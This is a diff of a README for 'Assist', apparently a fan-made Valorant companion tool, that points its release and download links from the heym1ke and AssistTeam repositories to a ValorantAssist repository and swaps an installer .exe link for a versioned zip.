@@ -8,7 +8,7 @@
 <h5 align="center">Assist was created under Riot Games' "Legal Jibber Jabber" policy using assets that are owned by Riot Games.</h5>
 <h5 align="center">Riot Games does not endorse or sponsor this project.</h5>
 
-[<p align="center"><img src="https://img.shields.io/github/downloads/heym1ke/Assist/total.svg?style=for-the-badge&color=f71d51" alt="Downloads">](https://github.com/Heym1ke/Assist/releases) [<img src="https://img.shields.io/github/v/release/heym1ke/Assist?style=for-the-badge&color=f71d51" alt="Latest Release">](https://github.com/Heym1ke/Assist/releases)</p>
+[<p align="center"><img src="https://img.shields.io/github/downloads/heym1ke/Assist/total.svg?style=for-the-badge&color=f71d51" alt="Downloads">](https://github.com/valorantassist/Assist/releases) [<img src="https://img.shields.io/github/v/release/heym1ke/Assist?style=for-the-badge&color=f71d51" alt="Latest Release">](https://github.com/valorantassist/Assist/releases)</p>
 
 <p align="center">
   <a href="https://discord.gg/C3AbvyM3dj"><img src="https://discordapp.com/api/guilds/939378402283118643/widget.png"></a>
@@ -17,7 +17,7 @@
 
 <p align="center">
   </a>
-  <a href="https://github.com/AssistTeam/AssistInstaller/releases/latest/download/AssistInstaller.exe"><img src="https://cdn.discordapp.com/attachments/939379020808720444/971898844432433182/Download.png" ></a>
+  <a href="https://github.com/ValorantAssist/Assist/releases/download/1.0.0.14/Assist.zip"><img src="https://cdn.discordapp.com/attachments/939379020808720444/971898844432433182/Download.png" ></a>
   </p>
 
 ## Install and Download Guide 
